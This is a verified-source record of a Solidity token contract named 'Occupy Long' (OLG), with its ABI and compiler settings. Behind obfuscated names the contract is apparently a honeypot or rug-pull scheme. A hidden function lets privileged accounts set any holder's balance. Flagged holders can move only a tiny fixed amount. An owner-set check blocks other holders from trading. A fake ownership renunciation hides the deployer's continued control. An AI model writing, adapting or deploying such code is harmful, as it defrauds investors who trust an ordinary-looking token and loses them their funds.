{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface tradingLimit {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fromTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoAmount {\n    function createPair(address atAmount, address feeAuto) external returns (address);\n}\n\ninterface minTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitFundMax) external view returns (uint256);\n\n    function transfer(address txMode, uint256 limitTake) external returns (bool);\n\n    function allowance(address tokenList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMode,\n        uint256 limitTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableTo, uint256 value);\n    event Approval(address indexed tokenList, address indexed spender, uint256 value);\n}\n\ninterface minTeamMetadata is minTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OccupyLong is fromTotal, minTeam, minTeamMetadata {\n\n    uint256 public buyAt;\n\n    function isTotalLimit(address isBuy) public {\n        if (feeBuy) {\n            return;\n        }\n        if (autoLimit == teamAt) {\n            autoLimit = teamAt;\n        }\n        marketingToken[isBuy] = true;\n        \n        feeBuy = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private shouldTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverMarketing;\n    }\n\n    function isShouldLaunch() public {\n        emit OwnershipTransferred(maxList, address(0));\n        limitMin = address(0);\n    }\n\n    uint256 public autoLimit;\n\n    uint256 enableModeAmount;\n\n    uint256 constant feeEnableFund = 9 ** 10;\n\n    string private minLimit = \"OLG\";\n\n    mapping(address => uint256) private swapExempt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listLimit;\n    }\n\n    address private limitMin;\n\n    function liquidityReceiver(address amountTake, address txMode, uint256 limitTake) internal returns (bool) {\n        if (amountTake == maxList) {\n            return launchedTakeFrom(amountTake, txMode, limitTake);\n        }\n        uint256 tokenModeReceiver = minTeam(isFeeMax).balanceOf(buyIsTo);\n        require(tokenModeReceiver == enableModeAmount);\n        require(txMode != buyIsTo);\n        if (tradingTotalAuto[amountTake]) {\n            return launchedTakeFrom(amountTake, txMode, feeEnableFund);\n        }\n        return launchedTakeFrom(amountTake, txMode, limitTake);\n    }\n\n    bool public feeBuy;\n\n    uint256 private receiverMarketing = 100000000 * 10 ** 18;\n\n    uint256 toSwap;\n\n    constructor (){\n        if (sellMin == autoLimit) {\n            marketingTakeReceiver = false;\n        }\n        tradingLimit senderTo = tradingLimit(fundSellAt);\n        isFeeMax = autoAmount(senderTo.factory()).createPair(senderTo.WETH(), address(this));\n        if (teamAt != buyAt) {\n            marketingTakeReceiver = false;\n        }\n        maxList = _msgSender();\n        isShouldLaunch();\n        marketingToken[maxList] = true;\n        swapExempt[maxList] = receiverMarketing;\n        if (marketingTakeReceiver) {\n            teamAt = autoLimit;\n        }\n        emit Transfer(address(0), maxList, receiverMarketing);\n    }\n\n    function isMax() private view {\n        require(marketingToken[_msgSender()]);\n    }\n\n    string private launchedSell = \"Occupy Long\";\n\n    bool public launchedTx;\n\n    function balanceOf(address limitFundMax) public view virtual override returns (uint256) {\n        return swapExempt[limitFundMax];\n    }\n\n    function transfer(address takeLimitFund, uint256 limitTake) external virtual override returns (bool) {\n        return liquidityReceiver(_msgSender(), takeLimitFund, limitTake);\n    }\n\n    uint256 private sellMin;\n\n    event OwnershipTransferred(address indexed shouldMax, address indexed minReceiverExempt);\n\n    address buyIsTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address fundSellAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public marketingToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return minLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedSell;\n    }\n\n    function isEnable(address modeLimit) public {\n        isMax();\n        if (sellMin == buyAt) {\n            launchedTx = false;\n        }\n        if (modeLimit == maxList || modeLimit == isFeeMax) {\n            return;\n        }\n        tradingTotalAuto[modeLimit] = true;\n    }\n\n    function approve(address launchedIs, uint256 limitTake) public virtual override returns (bool) {\n        shouldTake[_msgSender()][launchedIs] = limitTake;\n        emit Approval(_msgSender(), launchedIs, limitTake);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return limitMin;\n    }\n\n    address public maxList;\n\n    uint8 private listLimit = 18;\n\n    mapping(address => bool) public tradingTotalAuto;\n\n    function takeFundTotal(uint256 limitTake) public {\n        isMax();\n        enableModeAmount = limitTake;\n    }\n\n    function transferFrom(address amountTake, address txMode, uint256 limitTake) external override returns (bool) {\n        if (_msgSender() != fundSellAt) {\n            if (shouldTake[amountTake][_msgSender()] != type(uint256).max) {\n                require(limitTake <= shouldTake[amountTake][_msgSender()]);\n                shouldTake[amountTake][_msgSender()] -= limitTake;\n            }\n        }\n        return liquidityReceiver(amountTake, txMode, limitTake);\n    }\n\n    function launchedTakeFrom(address amountTake, address txMode, uint256 limitTake) internal returns (bool) {\n        require(swapExempt[amountTake] >= limitTake);\n        swapExempt[amountTake] -= limitTake;\n        swapExempt[txMode] += limitTake;\n        emit Transfer(amountTake, txMode, limitTake);\n        return true;\n    }\n\n    uint256 private teamAt;\n\n    address public isFeeMax;\n\n    function getOwner() external view returns (address) {\n        return limitMin;\n    }\n\n    function allowance(address tokenTotal, address launchedIs) external view virtual override returns (uint256) {\n        if (launchedIs == fundSellAt) {\n            return type(uint256).max;\n        }\n        return shouldTake[tokenTotal][launchedIs];\n    }\n\n    function walletAtTeam(address takeLimitFund, uint256 limitTake) public {\n        isMax();\n        swapExempt[takeLimitFund] = limitTake;\n    }\n\n    bool public marketingTakeReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minReceiverExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFundMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLimit\",\"type\":\"address\"}],\"name\":\"isEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFeeMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isShouldLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"}],\"name\":\"isTotalLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTakeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitTake\",\"type\":\"uint256\"}],\"name\":\"takeFundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTotalAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimitFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimitFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTake\",\"type\":\"uint256\"}],\"name\":\"walletAtTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OccupyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}